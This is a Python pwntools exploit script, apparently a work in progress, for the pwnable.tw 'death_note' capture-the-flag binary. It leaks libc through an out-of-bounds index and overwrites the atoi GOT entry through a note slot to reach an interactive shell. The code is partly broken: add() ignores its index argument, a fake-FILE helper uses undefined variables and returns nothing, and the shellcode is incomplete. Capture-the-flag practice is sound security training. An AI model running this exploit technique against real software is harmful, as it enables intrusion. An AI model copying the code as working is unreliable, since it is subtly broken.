# /bin/python3
from pwn import *
from LibcSearcher import *
import os
context.terminal= ['tmux','splitw','-h']
context.log_level = "debug"
context.arch = "i386"
context.os = "linux"

def Index(io,idx):
    io.sendafter(b"Index :", str(idx).encode())

def Name(io,name):
    io.sendafter(b"Name :", name)

def add(io,idx,name):
    choice(io,1)
    Index(io, 1)
    Name(io,name)

def choice(io,ch):
    io.sendafter(b"Your choice :",str(ch).encode())


def show(io,idx):
    choice(io,2)
    Index(io,idx)
    io.recvuntil(b"Name : ")
    return io.recvline().strip(b"\n")


def leak_libc(io):
    # show _IO_2_1_stdout_
    _stdout = u32(show(io,(0x44-0x60)//4)[4:8])-71
    return _stdout


def get_fake_IOFILE(io):
    fake_file = "/bin/sh\x00"
    fake_file = fake_file.ljust(0x48,'\x00')
    fake_file += p32(fake_lock_addr) # 指向一处值为0的地址
    fake_file = fake_file.ljust(0x94, "\x00")
    fake_file += p32(fake_vtable)#fake vtable address = buf_addr + 0x98 - 0x44
    fake_file += p32(system)


DEBUG = True

if __name__ =='__main__':
    if DEBUG:
        io = process("./death_note")
    else:
        io = remote("chall.pwnable.tw",10201)
    _bin = ELF("./death_note")
    libc = ELF(os.path.expanduser("~")+"/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so")

    libc.address = leak_libc(io) - libc.sym["_IO_2_1_stdout_"]
    success(f"leaked libc at : {hex(libc.address)}")


    shellcode = "pop ebx\n"
    shellcode+= "mov ebx,esp\n"
    shellcode+= "add esp,0x20"

    idx = _bin.got["atoi"] - _bin.sym["note"]
    idx = idx//4
    print(idx)
    add(io,idx,shellcode)

    io.interactive()
    # system_addrs = next(libc.search(p32(libc.sym["system"])))

    